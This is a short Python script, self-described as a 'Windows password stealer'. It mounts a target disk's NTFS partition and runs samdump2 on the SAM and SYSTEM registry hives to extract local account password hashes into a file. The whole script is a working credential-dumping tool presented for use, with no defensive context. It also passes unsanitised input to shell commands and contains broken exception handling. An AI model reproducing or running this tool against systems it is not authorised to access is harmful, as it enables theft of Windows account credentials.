import os
import argparse
banner="""                  ▄▄  ▄▄▄▄▄▄▄▄                                ▄▄        ▄▄
       ██        ██   ▀▀▀▀▀███                        ██       █▄        █▄
      ██        ██        ██▀    ▄████▄    ██▄████  ███████     █▄        █▄
     ██        ██       ▄██▀    ██▄▄▄▄██   ██▀        ██         █▄        █▄
    ▄█▀       ▄█▀      ▄██      ██▀▀▀▀▀▀   ██         ██          █▄        █
   ▄█▀       ▄█▀      ███▄▄▄▄▄  ▀██▄▄▄▄█   ██         ██▄▄▄        █▄        █▄
  ▄█▀       ▄█▀       ▀▀▀▀▀▀▀▀    ▀▀▀▀▀    ▀▀          ▀▀▀▀         █▄        █▄
 """
def parse_arguments():
 global disk 
 parser = argparse.ArgumentParser(description="Windows password stealer")
 parser.add_argument('disk', help="Disk with C:\ partition on it")
 args = parser.parse_args()
 disk= args.disk
def main():
 print(banner)
 parse_arguments()
 mount()
 make_hash()
def mount():
 try:
   os.mkdir('/mnt/windows')
   os.system("mount -t ntfs-3g {} /mnt/windows".format(disk))
   print("{} was mounted into direcory /mnt/windows".format(disk))
 except ex:
  print("Error({})".format(str(ex)))
  exit()
def make_hash():
  os.system("cd /mnt/windows/Windows/System32/config/ && samdump2 SYSTEM SAM -o {} && umount /mnt/windows".format(os.path.join(os.getcwd(),'hash')))
  print("Hash was saved in {}".format(os.path.join(os.getcwd(),'hash')))
main()
